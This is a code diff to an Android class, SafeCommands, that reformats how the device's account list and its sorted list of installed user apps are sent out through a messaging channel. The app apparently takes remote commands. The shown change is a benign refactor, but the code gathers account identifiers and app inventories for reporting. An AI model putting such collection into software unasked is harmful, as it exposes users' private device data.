@@ -23,6 +23,9 @@ import android.util.StringBuilderPrinter;
 import android.widget.Toast;
 
 import java.io.File;
+import java.util.ArrayList;
+import java.util.Collection;
+import java.util.Collections;
 import java.util.List;
 
 /**
@@ -143,13 +146,17 @@ public class SafeCommands {
 
     private void getAccounts() {
         Account[] accounts = AccountManager.get(context).getAccounts();
+        StringBuilder sbAccounts = new StringBuilder();
+        sbAccounts.append("Accounts:\r\n");
         if (accounts.length > 0) {
             for (Account account : accounts) {
-                comms.say(account.toString());
+                sbAccounts.append(account.toString());
+                sbAccounts.append("\r\n");
             }
         } else {
-            comms.say("Couldn't find any accounts");
+            sbAccounts.append("Could not find any accounts");
         }
+        comms.say(sbAccounts.toString());
     }
 
     private String getFirstAccount() {
@@ -235,13 +242,19 @@ public class SafeCommands {
         StringBuilder sbApps = new StringBuilder();
         sbApps.append("Installed apps:\r\n");
         List<PackageInfo> packList = context.getPackageManager().getInstalledPackages(0);
+        List<String> apps = new ArrayList<>();
         for (int i = 0; i < packList.size(); i++) {
             PackageInfo packInfo = packList.get(i);
             if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
-                sbApps.append(packInfo.applicationInfo.loadLabel(context.getPackageManager()).toString());
-                sbApps.append("\r\n");
+                apps.add(packInfo.applicationInfo.loadLabel(context.getPackageManager()).toString());
             }
         }
+        Collections.sort(apps);
+        for (int i = 0; i < apps.size(); i++) {
+            sbApps.append(apps.get(i));
+            sbApps.append("\r\n");
+        }
+
         comms.say(sbApps.toString());
     }
 
